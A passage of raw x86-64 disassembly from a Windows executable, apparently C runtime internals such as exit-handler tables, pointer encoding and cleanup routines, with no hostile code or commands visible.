   140005640:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005646:	e8 2d 14 00 00       	call   0x140006a78
   14000564b:	b8 16 00 00 00       	mov    $0x16,%eax
   140005650:	48 83 c4 28          	add    $0x28,%rsp
   140005654:	c3                   	ret
   140005655:	cc                   	int3
   140005656:	cc                   	int3
   140005657:	cc                   	int3
   140005658:	48 83 ec 28          	sub    $0x28,%rsp
   14000565c:	ff 15 1e ab 00 00    	call   *0xab1e(%rip)        # 0x140010180
   140005662:	48 89 05 07 5d 01 00 	mov    %rax,0x15d07(%rip)        # 0x14001b370
   140005669:	ff 15 19 ab 00 00    	call   *0xab19(%rip)        # 0x140010188
   14000566f:	48 89 05 02 5d 01 00 	mov    %rax,0x15d02(%rip)        # 0x14001b378
   140005676:	b0 01                	mov    $0x1,%al
   140005678:	48 83 c4 28          	add    $0x28,%rsp
   14000567c:	c3                   	ret
   14000567d:	cc                   	int3
   14000567e:	cc                   	int3
   14000567f:	cc                   	int3
   140005680:	48 8d 05 d1 5c 01 00 	lea    0x15cd1(%rip),%rax        # 0x14001b358
   140005687:	c3                   	ret
   140005688:	48 8d 05 d1 5c 01 00 	lea    0x15cd1(%rip),%rax        # 0x14001b360
   14000568f:	c3                   	ret
   140005690:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005695:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000569a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000569f:	57                   	push   %rdi
   1400056a0:	48 83 ec 30          	sub    $0x30,%rsp
   1400056a4:	49 8b f9             	mov    %r9,%rdi
   1400056a7:	8b 0a                	mov    (%rdx),%ecx
   1400056a9:	e8 be 35 00 00       	call   0x140008c6c
   1400056ae:	90                   	nop
   1400056af:	48 8d 1d 82 63 01 00 	lea    0x16382(%rip),%rbx        # 0x14001ba38
   1400056b6:	48 8d 35 23 4f 01 00 	lea    0x14f23(%rip),%rsi        # 0x14001a5e0
   1400056bd:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400056c2:	48 8d 05 77 63 01 00 	lea    0x16377(%rip),%rax        # 0x14001ba40
   1400056c9:	48 3b d8             	cmp    %rax,%rbx
   1400056cc:	74 19                	je     0x1400056e7
   1400056ce:	48 39 33             	cmp    %rsi,(%rbx)
   1400056d1:	74 0e                	je     0x1400056e1
   1400056d3:	48 8b d6             	mov    %rsi,%rdx
   1400056d6:	48 8b cb             	mov    %rbx,%rcx
   1400056d9:	e8 5e 44 00 00       	call   0x140009b3c
   1400056de:	48 89 03             	mov    %rax,(%rbx)
   1400056e1:	48 83 c3 08          	add    $0x8,%rbx
   1400056e5:	eb d6                	jmp    0x1400056bd
   1400056e7:	8b 0f                	mov    (%rdi),%ecx
   1400056e9:	e8 d2 35 00 00       	call   0x140008cc0
   1400056ee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400056f3:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400056f8:	48 83 c4 30          	add    $0x30,%rsp
   1400056fc:	5f                   	pop    %rdi
   1400056fd:	c3                   	ret
   1400056fe:	cc                   	int3
   1400056ff:	cc                   	int3
   140005700:	b8 01 00 00 00       	mov    $0x1,%eax
   140005705:	87 05 75 5c 01 00    	xchg   %eax,0x15c75(%rip)        # 0x14001b380
   14000570b:	c3                   	ret
   14000570c:	4c 8b dc             	mov    %rsp,%r11
   14000570f:	48 83 ec 28          	sub    $0x28,%rsp
   140005713:	b8 04 00 00 00       	mov    $0x4,%eax
   140005718:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   14000571c:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140005720:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140005724:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140005728:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000572c:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140005730:	e8 5b ff ff ff       	call   0x140005690
   140005735:	48 83 c4 28          	add    $0x28,%rsp
   140005739:	c3                   	ret
   14000573a:	cc                   	int3
   14000573b:	cc                   	int3
   14000573c:	40 53                	rex push %rbx
   14000573e:	48 83 ec 20          	sub    $0x20,%rsp
   140005742:	8b d9                	mov    %ecx,%ebx
   140005744:	e8 4b 0c 00 00       	call   0x140006394
   140005749:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140005750:	41 8b d0             	mov    %r8d,%edx
   140005753:	80 e2 02             	and    $0x2,%dl
   140005756:	f6 da                	neg    %dl
   140005758:	1b c9                	sbb    %ecx,%ecx
   14000575a:	83 fb ff             	cmp    $0xffffffff,%ebx
   14000575d:	74 36                	je     0x140005795
   14000575f:	85 db                	test   %ebx,%ebx
   140005761:	74 39                	je     0x14000579c
   140005763:	83 fb 01             	cmp    $0x1,%ebx
   140005766:	74 20                	je     0x140005788
   140005768:	83 fb 02             	cmp    $0x2,%ebx
   14000576b:	74 15                	je     0x140005782
   14000576d:	e8 42 14 00 00       	call   0x140006bb4
   140005772:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005778:	e8 fb 12 00 00       	call   0x140006a78
   14000577d:	83 c8 ff             	or     $0xffffffff,%eax
   140005780:	eb 1d                	jmp    0x14000579f
   140005782:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   140005786:	eb 04                	jmp    0x14000578c
   140005788:	41 83 c8 02          	or     $0x2,%r8d
   14000578c:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   140005793:	eb 07                	jmp    0x14000579c
   140005795:	83 0d 54 50 01 00 ff 	orl    $0xffffffff,0x15054(%rip)        # 0x14001a7f0
   14000579c:	8d 41 02             	lea    0x2(%rcx),%eax
   14000579f:	48 83 c4 20          	add    $0x20,%rsp
   1400057a3:	5b                   	pop    %rbx
   1400057a4:	c3                   	ret
   1400057a5:	cc                   	int3
   1400057a6:	cc                   	int3
   1400057a7:	cc                   	int3
   1400057a8:	8b 05 d6 5b 01 00    	mov    0x15bd6(%rip),%eax        # 0x14001b384
   1400057ae:	90                   	nop
   1400057af:	c3                   	ret
   1400057b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400057b4:	83 f9 01             	cmp    $0x1,%ecx
   1400057b7:	76 15                	jbe    0x1400057ce
   1400057b9:	e8 f6 13 00 00       	call   0x140006bb4
   1400057be:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400057c4:	e8 af 12 00 00       	call   0x140006a78
   1400057c9:	83 c8 ff             	or     $0xffffffff,%eax
   1400057cc:	eb 08                	jmp    0x1400057d6
   1400057ce:	87 0d b0 5b 01 00    	xchg   %ecx,0x15bb0(%rip)        # 0x14001b384
   1400057d4:	8b c1                	mov    %ecx,%eax
   1400057d6:	48 83 c4 28          	add    $0x28,%rsp
   1400057da:	c3                   	ret
   1400057db:	cc                   	int3
   1400057dc:	48 8d 05 a5 5b 01 00 	lea    0x15ba5(%rip),%rax        # 0x14001b388
   1400057e3:	c3                   	ret
   1400057e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400057e9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400057ee:	57                   	push   %rdi
   1400057ef:	48 83 ec 20          	sub    $0x20,%rsp
   1400057f3:	49 8b d9             	mov    %r9,%rbx
   1400057f6:	49 8b f8             	mov    %r8,%rdi
   1400057f9:	8b 0a                	mov    (%rdx),%ecx
   1400057fb:	e8 6c 34 00 00       	call   0x140008c6c
   140005800:	90                   	nop
   140005801:	48 8b cf             	mov    %rdi,%rcx
   140005804:	e8 53 00 00 00       	call   0x14000585c
   140005809:	8b f8                	mov    %eax,%edi
   14000580b:	8b 0b                	mov    (%rbx),%ecx
   14000580d:	e8 ae 34 00 00       	call   0x140008cc0
   140005812:	8b c7                	mov    %edi,%eax
   140005814:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005819:	48 83 c4 20          	add    $0x20,%rsp
   14000581d:	5f                   	pop    %rdi
   14000581e:	c3                   	ret
   14000581f:	cc                   	int3
   140005820:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005825:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000582a:	57                   	push   %rdi
   14000582b:	48 83 ec 20          	sub    $0x20,%rsp
   14000582f:	49 8b d9             	mov    %r9,%rbx
   140005832:	49 8b f8             	mov    %r8,%rdi
   140005835:	8b 0a                	mov    (%rdx),%ecx
   140005837:	e8 30 34 00 00       	call   0x140008c6c
   14000583c:	90                   	nop
   14000583d:	48 8b cf             	mov    %rdi,%rcx
   140005840:	e8 c7 01 00 00       	call   0x140005a0c
   140005845:	8b f8                	mov    %eax,%edi
   140005847:	8b 0b                	mov    (%rbx),%ecx
   140005849:	e8 72 34 00 00       	call   0x140008cc0
   14000584e:	8b c7                	mov    %edi,%eax
   140005850:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005855:	48 83 c4 20          	add    $0x20,%rsp
   140005859:	5f                   	pop    %rdi
   14000585a:	c3                   	ret
   14000585b:	cc                   	int3
   14000585c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005861:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005866:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000586b:	57                   	push   %rdi
   14000586c:	41 56                	push   %r14
   14000586e:	41 57                	push   %r15
   140005870:	48 83 ec 20          	sub    $0x20,%rsp
   140005874:	48 8b 01             	mov    (%rcx),%rax
   140005877:	33 ed                	xor    %ebp,%ebp
   140005879:	4c 8b f9             	mov    %rcx,%r15
   14000587c:	48 8b 10             	mov    (%rax),%rdx
   14000587f:	48 85 d2             	test   %rdx,%rdx
   140005882:	0f 84 68 01 00 00    	je     0x1400059f0
   140005888:	4c 8b 15 71 47 01 00 	mov    0x14771(%rip),%r10        # 0x14001a000
   14000588f:	41 8b ca             	mov    %r10d,%ecx
   140005892:	49 8b f2             	mov    %r10,%rsi
   140005895:	48 33 32             	xor    (%rdx),%rsi
   140005898:	83 e1 3f             	and    $0x3f,%ecx
   14000589b:	4d 8b ca             	mov    %r10,%r9
   14000589e:	48 d3 ce             	ror    %cl,%rsi
   1400058a1:	4c 33 4a 08          	xor    0x8(%rdx),%r9
   1400058a5:	49 8b da             	mov    %r10,%rbx
   1400058a8:	48 33 5a 10          	xor    0x10(%rdx),%rbx
   1400058ac:	49 d3 c9             	ror    %cl,%r9
   1400058af:	48 d3 cb             	ror    %cl,%rbx
   1400058b2:	4c 3b cb             	cmp    %rbx,%r9
   1400058b5:	0f 85 a7 00 00 00    	jne    0x140005962
   1400058bb:	48 2b de             	sub    %rsi,%rbx
   1400058be:	b8 00 02 00 00       	mov    $0x200,%eax
   1400058c3:	48 c1 fb 03          	sar    $0x3,%rbx
   1400058c7:	48 3b d8             	cmp    %rax,%rbx
   1400058ca:	48 8b fb             	mov    %rbx,%rdi
   1400058cd:	48 0f 47 f8          	cmova  %rax,%rdi
   1400058d1:	8d 45 20             	lea    0x20(%rbp),%eax
   1400058d4:	48 03 fb             	add    %rbx,%rdi
   1400058d7:	48 0f 44 f8          	cmove  %rax,%rdi
   1400058db:	48 3b fb             	cmp    %rbx,%rdi
   1400058de:	72 1e                	jb     0x1400058fe
   1400058e0:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   1400058e4:	48 8b d7             	mov    %rdi,%rdx
   1400058e7:	48 8b ce             	mov    %rsi,%rcx
   1400058ea:	e8 3d 48 00 00       	call   0x14000a12c
   1400058ef:	33 c9                	xor    %ecx,%ecx
   1400058f1:	4c 8b f0             	mov    %rax,%r14
   1400058f4:	e8 53 13 00 00       	call   0x140006c4c
   1400058f9:	4d 85 f6             	test   %r14,%r14
   1400058fc:	75 28                	jne    0x140005926
   1400058fe:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   140005902:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140005908:	48 8b d7             	mov    %rdi,%rdx
   14000590b:	48 8b ce             	mov    %rsi,%rcx
   14000590e:	e8 19 48 00 00       	call   0x14000a12c
   140005913:	33 c9                	xor    %ecx,%ecx
   140005915:	4c 8b f0             	mov    %rax,%r14
   140005918:	e8 2f 13 00 00       	call   0x140006c4c
   14000591d:	4d 85 f6             	test   %r14,%r14
   140005920:	0f 84 ca 00 00 00    	je     0x1400059f0
   140005926:	4c 8b 15 d3 46 01 00 	mov    0x146d3(%rip),%r10        # 0x14001a000
   14000592d:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   140005931:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   140005935:	49 8b f6             	mov    %r14,%rsi
   140005938:	48 8b cb             	mov    %rbx,%rcx
   14000593b:	49 2b c9             	sub    %r9,%rcx
   14000593e:	48 83 c1 07          	add    $0x7,%rcx
   140005942:	48 c1 e9 03          	shr    $0x3,%rcx
   140005946:	4c 3b cb             	cmp    %rbx,%r9
   140005949:	48 0f 47 cd          	cmova  %rbp,%rcx
   14000594d:	48 85 c9             	test   %rcx,%rcx
   140005950:	74 10                	je     0x140005962
   140005952:	49 8b c2             	mov    %r10,%rax
   140005955:	49 8b f9             	mov    %r9,%rdi
   140005958:	f3 48 ab             	rep stos %rax,(%rdi)
   14000595b:	4c 8b 15 9e 46 01 00 	mov    0x1469e(%rip),%r10        # 0x14001a000
   140005962:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140005968:	49 8d 79 08          	lea    0x8(%r9),%rdi
   14000596c:	41 8b c8             	mov    %r8d,%ecx
   14000596f:	41 8b c2             	mov    %r10d,%eax
   140005972:	83 e0 3f             	and    $0x3f,%eax
   140005975:	2b c8                	sub    %eax,%ecx
   140005977:	49 8b 47 08          	mov    0x8(%r15),%rax
   14000597b:	48 8b 10             	mov    (%rax),%rdx
   14000597e:	41 8b c0             	mov    %r8d,%eax
   140005981:	48 d3 ca             	ror    %cl,%rdx
   140005984:	49 33 d2             	xor    %r10,%rdx
   140005987:	49 89 11             	mov    %rdx,(%r9)
   14000598a:	48 8b 15 6f 46 01 00 	mov    0x1466f(%rip),%rdx        # 0x14001a000
   140005991:	8b ca                	mov    %edx,%ecx
   140005993:	83 e1 3f             	and    $0x3f,%ecx
   140005996:	2b c1                	sub    %ecx,%eax
   140005998:	8a c8                	mov    %al,%cl
   14000599a:	49 8b 07             	mov    (%r15),%rax
   14000599d:	48 d3 ce             	ror    %cl,%rsi
   1400059a0:	48 33 f2             	xor    %rdx,%rsi
   1400059a3:	48 8b 08             	mov    (%rax),%rcx
   1400059a6:	48 89 31             	mov    %rsi,(%rcx)
   1400059a9:	41 8b c8             	mov    %r8d,%ecx
   1400059ac:	48 8b 15 4d 46 01 00 	mov    0x1464d(%rip),%rdx        # 0x14001a000
   1400059b3:	8b c2                	mov    %edx,%eax
   1400059b5:	83 e0 3f             	and    $0x3f,%eax
   1400059b8:	2b c8                	sub    %eax,%ecx
   1400059ba:	49 8b 07             	mov    (%r15),%rax
   1400059bd:	48 d3 cf             	ror    %cl,%rdi
   1400059c0:	48 33 fa             	xor    %rdx,%rdi
   1400059c3:	48 8b 10             	mov    (%rax),%rdx
   1400059c6:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   1400059ca:	48 8b 15 2f 46 01 00 	mov    0x1462f(%rip),%rdx        # 0x14001a000
   1400059d1:	8b c2                	mov    %edx,%eax
   1400059d3:	83 e0 3f             	and    $0x3f,%eax
   1400059d6:	44 2b c0             	sub    %eax,%r8d
   1400059d9:	49 8b 07             	mov    (%r15),%rax
   1400059dc:	41 8a c8             	mov    %r8b,%cl
   1400059df:	48 d3 cb             	ror    %cl,%rbx
   1400059e2:	48 33 da             	xor    %rdx,%rbx
   1400059e5:	48 8b 08             	mov    (%rax),%rcx
   1400059e8:	33 c0                	xor    %eax,%eax
   1400059ea:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400059ee:	eb 03                	jmp    0x1400059f3
   1400059f0:	83 c8 ff             	or     $0xffffffff,%eax
   1400059f3:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400059f8:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400059fd:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005a02:	48 83 c4 20          	add    $0x20,%rsp
   140005a06:	41 5f                	pop    %r15
   140005a08:	41 5e                	pop    %r14
   140005a0a:	5f                   	pop    %rdi
   140005a0b:	c3                   	ret
   140005a0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a11:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005a16:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005a1b:	57                   	push   %rdi
   140005a1c:	41 56                	push   %r14
   140005a1e:	41 57                	push   %r15
   140005a20:	48 83 ec 20          	sub    $0x20,%rsp
   140005a24:	48 8b 01             	mov    (%rcx),%rax
   140005a27:	48 8b f1             	mov    %rcx,%rsi
   140005a2a:	48 8b 10             	mov    (%rax),%rdx
   140005a2d:	48 85 d2             	test   %rdx,%rdx
   140005a30:	75 08                	jne    0x140005a3a
   140005a32:	83 c8 ff             	or     $0xffffffff,%eax
   140005a35:	e9 d9 00 00 00       	jmp    0x140005b13
   140005a3a:	4c 8b 05 bf 45 01 00 	mov    0x145bf(%rip),%r8        # 0x14001a000
   140005a41:	41 8b c8             	mov    %r8d,%ecx
   140005a44:	49 8b f8             	mov    %r8,%rdi
   140005a47:	48 33 3a             	xor    (%rdx),%rdi
   140005a4a:	83 e1 3f             	and    $0x3f,%ecx
   140005a4d:	48 d3 cf             	ror    %cl,%rdi
   140005a50:	49 8b d8             	mov    %r8,%rbx
   140005a53:	48 33 5a 08          	xor    0x8(%rdx),%rbx
   140005a57:	48 d3 cb             	ror    %cl,%rbx
   140005a5a:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140005a5e:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140005a62:	0f 87 a9 00 00 00    	ja     0x140005b11
   140005a68:	41 8b c8             	mov    %r8d,%ecx
   140005a6b:	4d 8b f0             	mov    %r8,%r14
   140005a6e:	83 e1 3f             	and    $0x3f,%ecx
   140005a71:	4c 8b ff             	mov    %rdi,%r15
   140005a74:	48 8b eb             	mov    %rbx,%rbp
   140005a77:	48 83 eb 08          	sub    $0x8,%rbx
   140005a7b:	48 3b df             	cmp    %rdi,%rbx
   140005a7e:	72 5f                	jb     0x140005adf
   140005a80:	48 8b 03             	mov    (%rbx),%rax
   140005a83:	49 3b c6             	cmp    %r14,%rax
   140005a86:	74 ef                	je     0x140005a77
   140005a88:	49 33 c0             	xor    %r8,%rax
   140005a8b:	4c 89 33             	mov    %r14,(%rbx)
   140005a8e:	48 d3 c8             	ror    %cl,%rax
   140005a91:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140005a98:	3e f1 85 
   140005a9b:	ff 15 1f a8 00 00    	call   *0xa81f(%rip)        # 0x1400102c0
   140005aa1:	4c 8b 05 58 45 01 00 	mov    0x14558(%rip),%r8        # 0x14001a000
   140005aa8:	48 8b 06             	mov    (%rsi),%rax
   140005aab:	41 8b c8             	mov    %r8d,%ecx
   140005aae:	83 e1 3f             	and    $0x3f,%ecx
   140005ab1:	4d 8b c8             	mov    %r8,%r9
   140005ab4:	48 8b 10             	mov    (%rax),%rdx
   140005ab7:	49 8b c0             	mov    %r8,%rax
   140005aba:	4c 33 0a             	xor    (%rdx),%r9
   140005abd:	48 33 42 08          	xor    0x8(%rdx),%rax
   140005ac1:	49 d3 c9             	ror    %cl,%r9
   140005ac4:	48 d3 c8             	ror    %cl,%rax
   140005ac7:	4d 3b cf             	cmp    %r15,%r9
   140005aca:	75 05                	jne    0x140005ad1
   140005acc:	48 3b c5             	cmp    %rbp,%rax
   140005acf:	74 a6                	je     0x140005a77
   140005ad1:	4d 8b f9             	mov    %r9,%r15
   140005ad4:	49 8b f9             	mov    %r9,%rdi
   140005ad7:	48 8b e8             	mov    %rax,%rbp
   140005ada:	48 8b d8             	mov    %rax,%rbx
   140005add:	eb 98                	jmp    0x140005a77
   140005adf:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140005ae3:	74 0f                	je     0x140005af4
   140005ae5:	48 8b cf             	mov    %rdi,%rcx
   140005ae8:	e8 5f 11 00 00       	call   0x140006c4c
   140005aed:	4c 8b 05 0c 45 01 00 	mov    0x1450c(%rip),%r8        # 0x14001a000
   140005af4:	48 8b 06             	mov    (%rsi),%rax
   140005af7:	48 8b 08             	mov    (%rax),%rcx
   140005afa:	4c 89 01             	mov    %r8,(%rcx)
   140005afd:	48 8b 06             	mov    (%rsi),%rax
   140005b00:	48 8b 08             	mov    (%rax),%rcx
   140005b03:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140005b07:	48 8b 06             	mov    (%rsi),%rax
   140005b0a:	48 8b 08             	mov    (%rax),%rcx
   140005b0d:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140005b11:	33 c0                	xor    %eax,%eax
   140005b13:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005b18:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140005b1d:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005b22:	48 83 c4 20          	add    $0x20,%rsp
   140005b26:	41 5f                	pop    %r15
   140005b28:	41 5e                	pop    %r14
   140005b2a:	5f                   	pop    %rdi
   140005b2b:	c3                   	ret
   140005b2c:	48 8b d1             	mov    %rcx,%rdx
   140005b2f:	48 8d 0d 5a 58 01 00 	lea    0x1585a(%rip),%rcx        # 0x14001b390
   140005b36:	e9 6d 00 00 00       	jmp    0x140005ba8
   140005b3b:	cc                   	int3
   140005b3c:	4c 8b dc             	mov    %rsp,%r11
   140005b3f:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140005b43:	48 83 ec 38          	sub    $0x38,%rsp
   140005b47:	49 c7 43 f0 fe ff ff 	movq   $0xfffffffffffffffe,-0x10(%r11)
   140005b4e:	ff 
   140005b4f:	49 8d 43 08          	lea    0x8(%r11),%rax
   140005b53:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140005b57:	b8 02 00 00 00       	mov    $0x2,%eax
   140005b5c:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140005b60:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140005b64:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140005b68:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140005b6c:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140005b70:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   140005b74:	e8 a7 fc ff ff       	call   0x140005820
   140005b79:	90                   	nop
   140005b7a:	48 83 c4 38          	add    $0x38,%rsp
   140005b7e:	c3                   	ret
   140005b7f:	cc                   	int3
   140005b80:	48 85 c9             	test   %rcx,%rcx
   140005b83:	75 04                	jne    0x140005b89
   140005b85:	83 c8 ff             	or     $0xffffffff,%eax
   140005b88:	c3                   	ret
   140005b89:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140005b8d:	48 39 01             	cmp    %rax,(%rcx)
   140005b90:	75 12                	jne    0x140005ba4
   140005b92:	48 8b 05 67 44 01 00 	mov    0x14467(%rip),%rax        # 0x14001a000
   140005b99:	48 89 01             	mov    %rax,(%rcx)
   140005b9c:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140005ba0:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140005ba4:	33 c0                	xor    %eax,%eax
   140005ba6:	c3                   	ret
   140005ba7:	cc                   	int3
   140005ba8:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140005bad:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140005bb2:	55                   	push   %rbp
   140005bb3:	48 8b ec             	mov    %rsp,%rbp
   140005bb6:	48 83 ec 40          	sub    $0x40,%rsp
   140005bba:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140005bbe:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005bc2:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140005bc6:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140005bca:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005bce:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140005bd2:	b8 02 00 00 00       	mov    $0x2,%eax
   140005bd7:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140005bdb:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140005bdf:	89 45 28             	mov    %eax,0x28(%rbp)
   140005be2:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140005be5:	e8 fa fb ff ff       	call   0x1400057e4
   140005bea:	48 83 c4 40          	add    $0x40,%rsp
   140005bee:	5d                   	pop    %rbp
   140005bef:	c3                   	ret
   140005bf0:	48 8d 05 e9 49 01 00 	lea    0x149e9(%rip),%rax        # 0x14001a5e0
   140005bf7:	48 89 05 3a 5e 01 00 	mov    %rax,0x15e3a(%rip)        # 0x14001ba38
   140005bfe:	b0 01                	mov    $0x1,%al
   140005c00:	c3                   	ret
   140005c01:	cc                   	int3
   140005c02:	cc                   	int3
   140005c03:	cc                   	int3
   140005c04:	48 83 ec 28          	sub    $0x28,%rsp
   140005c08:	48 8d 0d 81 57 01 00 	lea    0x15781(%rip),%rcx        # 0x14001b390
   140005c0f:	e8 6c ff ff ff       	call   0x140005b80
   140005c14:	48 8d 0d 8d 57 01 00 	lea    0x1578d(%rip),%rcx        # 0x14001b3a8
   140005c1b:	e8 60 ff ff ff       	call   0x140005b80
   140005c20:	b0 01                	mov    $0x1,%al
   140005c22:	48 83 c4 28          	add    $0x28,%rsp
   140005c26:	c3                   	ret
   140005c27:	cc                   	int3
   140005c28:	48 83 ec 28          	sub    $0x28,%rsp
   140005c2c:	e8 ab f5 ff ff       	call   0x1400051dc
   140005c31:	b0 01                	mov    $0x1,%al
   140005c33:	48 83 c4 28          	add    $0x28,%rsp
   140005c37:	c3                   	ret
   140005c38:	40 53                	rex push %rbx
   140005c3a:	48 83 ec 20          	sub    $0x20,%rsp
   140005c3e:	48 8b 1d bb 43 01 00 	mov    0x143bb(%rip),%rbx        # 0x14001a000
   140005c45:	48 8b cb             	mov    %rbx,%rcx
   140005c48:	e8 bb 0c 00 00       	call   0x140006908
   140005c4d:	48 8b cb             	mov    %rbx,%rcx
   140005c50:	e8 73 46 00 00       	call   0x14000a2c8
   140005c55:	48 8b cb             	mov    %rbx,%rcx
   140005c58:	e8 63 47 00 00       	call   0x14000a3c0
   140005c5d:	48 8b cb             	mov    %rbx,%rcx
   140005c60:	e8 3f ee ff ff       	call   0x140004aa4
   140005c65:	48 8b cb             	mov    %rbx,%rcx
   140005c68:	e8 2b f9 ff ff       	call   0x140005598
   140005c6d:	b0 01                	mov    $0x1,%al
   140005c6f:	48 83 c4 20          	add    $0x20,%rsp
   140005c73:	5b                   	pop    %rbx
   140005c74:	c3                   	ret
   140005c75:	cc                   	int3
   140005c76:	cc                   	int3
   140005c77:	cc                   	int3
   140005c78:	33 c9                	xor    %ecx,%ecx
   140005c7a:	e9 21 c7 ff ff       	jmp    0x1400023a0
   140005c7f:	cc                   	int3
   140005c80:	40 53                	rex push %rbx
   140005c82:	48 83 ec 20          	sub    $0x20,%rsp
   140005c86:	48 8b 0d 4b 57 01 00 	mov    0x1574b(%rip),%rcx        # 0x14001b3d8
   140005c8d:	83 c8 ff             	or     $0xffffffff,%eax
   140005c90:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140005c94:	83 f8 01             	cmp    $0x1,%eax
   140005c97:	75 1f                	jne    0x140005cb8
   140005c99:	48 8b 0d 38 57 01 00 	mov    0x15738(%rip),%rcx        # 0x14001b3d8
   140005ca0:	48 8d 1d f9 43 01 00 	lea    0x143f9(%rip),%rbx        # 0x14001a0a0
   140005ca7:	48 3b cb             	cmp    %rbx,%rcx
   140005caa:	74 0c                	je     0x140005cb8
   140005cac:	e8 9b 0f 00 00       	call   0x140006c4c
   140005cb1:	48 89 1d 20 57 01 00 	mov    %rbx,0x15720(%rip)        # 0x14001b3d8
   140005cb8:	b0 01                	mov    $0x1,%al
   140005cba:	48 83 c4 20          	add    $0x20,%rsp
   140005cbe:	5b                   	pop    %rbx
   140005cbf:	c3                   	ret
   140005cc0:	48 83 ec 28          	sub    $0x28,%rsp
   140005cc4:	48 8b 0d 65 5f 01 00 	mov    0x15f65(%rip),%rcx        # 0x14001bc30
   140005ccb:	e8 7c 0f 00 00       	call   0x140006c4c
   140005cd0:	48 8b 0d 61 5f 01 00 	mov    0x15f61(%rip),%rcx        # 0x14001bc38
   140005cd7:	48 83 25 51 5f 01 00 	andq   $0x0,0x15f51(%rip)        # 0x14001bc30
   140005cde:	00 
   140005cdf:	e8 68 0f 00 00       	call   0x140006c4c
   140005ce4:	48 8b 0d 75 56 01 00 	mov    0x15675(%rip),%rcx        # 0x14001b360
   140005ceb:	48 83 25 45 5f 01 00 	andq   $0x0,0x15f45(%rip)        # 0x14001bc38
   140005cf2:	00 
   140005cf3:	e8 54 0f 00 00       	call   0x140006c4c
   140005cf8:	48 8b 0d 69 56 01 00 	mov    0x15669(%rip),%rcx        # 0x14001b368
   140005cff:	48 83 25 59 56 01 00 	andq   $0x0,0x15659(%rip)        # 0x14001b360
   140005d06:	00 
   140005d07:	e8 40 0f 00 00       	call   0x140006c4c
   140005d0c:	48 83 25 54 56 01 00 	andq   $0x0,0x15654(%rip)        # 0x14001b368
   140005d13:	00 
   140005d14:	b0 01                	mov    $0x1,%al
   140005d16:	48 83 c4 28          	add    $0x28,%rsp
   140005d1a:	c3                   	ret
   140005d1b:	cc                   	int3
